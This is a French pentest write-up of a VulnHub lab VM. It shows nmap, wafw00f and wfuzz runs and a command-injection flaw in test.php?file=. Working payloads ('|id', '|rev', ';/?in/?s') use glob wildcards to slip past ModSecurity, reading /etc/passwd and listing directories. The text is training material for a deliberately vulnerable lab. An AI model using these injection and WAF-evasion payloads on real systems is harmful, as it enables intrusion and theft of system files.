@@ -1,0 +1,234 @@
+En faisant un pentest d'une VM de vulnhub :
+
+la VM : 10.0.1.216
+
+root@debian-10:~# nmap -sC -sV -A 10.0.1.216
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-22 16:59 UTC
+Nmap scan report for MinU (10.0.1.216)
+Host is up (0.00072s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.27
+|_http-server-header: Apache/2.4.27 (Ubuntu)
+|_http-title: 403 Forbidden
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.10 - 4.11
+Network Distance: 2 hops
+Service Info: Host: 127.0.1.1
+
+TRACEROUTE (using port 53/tcp)
+HOP RTT     ADDRESS
+1   0.09 ms 10.233.33.1
+2   0.95 ms MinU (10.0.1.216)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.68 seconds
+root@debian-10:~# 
+
+Rien de plus que le port 80...
+On va quand même chercher des fichiers avec les extensions php,txt,html en premier :
+
+ICI gobuster ou wfuzz
+
+On va chercher à savoir si il le site est protégé, c'est super bizarre (?) :
+le résultat tombe enfin :
+root@debian-10:~/gitrepo# wafw00f http://10.0.1.216
+
+                                 ^     ^
+        _   __  _   ____ _   __  _    _   ____
+       ///7/ /.' \ / __////7/ /,' \ ,' \ / __/
+      | V V // o // _/ | V V // 0 // 0 // _/
+      |_n_,'/_n_//_/   |_n_,' \_,' \_,'/_/
+                                <
+                                ...'
+
+    WAFW00F - Web Application Firewall Detection Tool
+
+    By Sandro Gauci && Wendel G. Henrique
+
+Checking http://10.0.1.216
+The site http://10.0.1.216 is behind a ModSecurity (OWASP CRS)
+Number of requests: 11
+
+
+on decouvre l'url http://10.0.1.216/test.php?file=last.html, car on lit le code de la page qui est affichée
+root@debian-10:~/gitrepo# curl -s 'http://10.0.1.216/test.php?file=test.php'
+
+
+on va faire u peu de fuzzing pour voir ce qui passe on sait jamais LFI RFI...
+root@debian-10:~/gitrepo# wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/All_attack.txt --sc 200 http://10.0.1.216/test.php?file=FUZZ 
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.3 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.0.1.216/test.php?file=FUZZ
+Total requests: 468
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000002:  C=200     40 L	     159 W	   1986 Ch	  "TRUE"
+000001:  C=200     40 L	     159 W	   1986 Ch	  "A"
+000004:  C=200     40 L	     159 W	   1986 Ch	  "0"
+000007:  C=200     40 L	     159 W	   1986 Ch	  "-1"
+000008:  C=200     40 L	     159 W	   1986 Ch	  "1.0"
+000009:  C=200     40 L	     159 W	   1986 Ch	  "-1.0"
+000010:  C=200     40 L	     159 W	   1986 Ch	  "2"
+000005:  C=200     40 L	     159 W	   1986 Ch	  "00"
+000006:  C=200     40 L	     159 W	   1986 Ch	  "1"
+000003:  C=200     40 L	     159 W	   1986 Ch	  "FALSE"
+000011:  C=200     40 L	     159 W	   1986 Ch	  "-2"
+000012:  C=200     40 L	     159 W	   1986 Ch	  "-20"
+000015:  C=200     40 L	     159 W	   1986 Ch	  "-268435455"
+000021:  C=200     40 L	     159 W	   1986 Ch	  "\00"
+000019:  C=200     40 L	     159 W	   1986 Ch	  "null"
+000018:  C=200     40 L	     159 W	   1986 Ch	  "NULL"
+000013:  C=200     40 L	     159 W	   1986 Ch	  "65536"
+000014:  C=200     40 L	     159 W	   1986 Ch	  "268435455"
+000026:  C=200     40 L	     159 W	   1986 Ch	  "\0"
+000020:  C=200     40 L	     159 W	   1986 Ch	  "\0"
+000027:  C=200     40 L	     159 W	   1986 Ch	  "\0\0"
+000031:  C=200     40 L	     159 W	   1986 Ch	  "\00\00\00"
+000029:  C=200     40 L	     159 W	   1986 Ch	  "\00"
+000030:  C=200     40 L	     159 W	   1986 Ch	  "\00\00"
+000032:  C=200     40 L	     159 W	   1986 Ch	  "$null"
+000028:  C=200     40 L	     159 W	   1986 Ch	  "\0\0\0"
+000033:  C=200     40 L	     159 W	   1986 Ch	  "$NULL"
+000047:  C=200     40 L	     159 W	   1986 Ch	  "|dir|"
+000046:  C=200     41 L	     163 W	   2033 Ch	  "|dir"
+000041:  C=200     40 L	     159 W	   1986 Ch	  "|id|"
+000042:  C=200     40 L	     159 W	   1986 Ch	  "&quot;;id&quot;"
+000040:  C=200     40 L	     159 W	   1986 Ch	  "\"blah"
+000057:  C=200     40 L	     159 W	   1986 Ch	  "?x=>"
+000058:  C=200     40 L	     159 W	   1986 Ch	  "/index.html|id|"
+000056:  C=200     40 L	     159 W	   1986 Ch	  "?x=|"
+000045:  C=200     41 L	     162 W	   2040 Ch	  "|id"
+000054:  C=200     40 L	     159 W	   1986 Ch	  "?x="
+000099:  C=403     11 L	      32 W	    293 Ch	  "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+Fatal exception: Pycurl error 3: 
+root@debian-10:~/gitrepo# 
+
+
+http://10.0.1.216/test.php?file=last.html|id le 'pipe' passe et on récolte des infos
+uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+
+meme chose avec : http://10.0.1.216/test.php?file=last.html|dir
+on obtient le contenu du dir local :
+client.min.js index.html last.html test.php 
+
+j'aimerais bien savoir comment ça s'affiche :
+on teste à nouveau :
+http://10.0.1.216/test.php?file=--version
+et on obtient :
+cat (GNU coreutils) 8.26 Copyright (C) 2016 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later . This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Written by Torbjorn Granlund and Richard M. Stallman. 
+
+donc ça ressemble à du php qui utilise cat :
+ 
+
+mais je veux en être sur !! ET C'EST LA que le tricks est bô :
+root@debian-10:~/gitrepo# curl -s 'http://10.0.1.216/test.php?file=test.php|rev' | sed '/DOCTYPE/,/<\/html>/d' | rev | head 
+<?php echo shell_exec('cat ' . $_GET['file']);?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>OMGJS</title>
+    <script src='client.min.js'></script>
+</head>
+<body>
+    <h2>OMGJS - <strike>Everything</strike> a browser knows about you</h2>
+    <small>It actually knows more...</small>
+
+et la je vois cette ligne :
+<?php echo shell_exec('cat ' . $_GET['file']);?>
+
+pas mal on affiche le code php de la page test.php et surtout la méthode cat !!!!
+On peut donc aussi afficher d'autre choses , bash à la facheuse tendance à remplcer les carractères "*" ou "?"
+root@debian-10:~/gitrepo# curl -s 'http://10.0.1.216/test.php?file=/e?c/?asswd' | sed '/DOCTYPE/,/<\/html>/d' 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+messagebus:x:105:109::/var/run/dbus:/bin/false
+_apt:x:106:65534::/nonexistent:/bin/false
+mysql:x:107:110:MySQL Server,,,:/nonexistent:/bin/false
+uuidd:x:108:113::/run/uuidd:/bin/false
+bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
+
+root@debian-10:~/gitrepo# curl -s 'http://10.0.1.216/test.php?file=last.html|tac;/?in/?s' | sed '/DOCTYPE/,/<\/html>/d' 
+/bin/ps
+/bin/ss
+
+root@debian-10:~/gitrepo# curl -s 'http://10.0.1.216/test.php?file=last.html|tac;/?in/?s+la+/' | sed '/DOCTYPE/,/<\/html>/d' 
+/bin/ps
+/bin/ss
+
+/:
+bin
+boot
+dev
+etc
+home
+initrd.img
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+swapfile
+sys
+tmp
+usr
+var
+vmlinuz
+
+root@debian-10:~/gitrepo# curl -s 'http://10.0.1.216/test.php?file=last.html|id;/?in/?s+ls+/?ome/' | sed '/DOCTYPE/,/<\/html>/d' 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/ps
+/bin/ss
+
+/home/:
+bob
+
+root@debian-10:~/gitrepo# curl -s 'http://10.0.1.216/test.php?file=last.html|id;/?in/?s+ls+/var/www/html' | sed '/DOCTYPE/,/<\/html>/d' 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/ps
+/bin/ss
+
+/var/www/html:
+client.min.js
+index.html
+last.html
+test.php
+
+
+
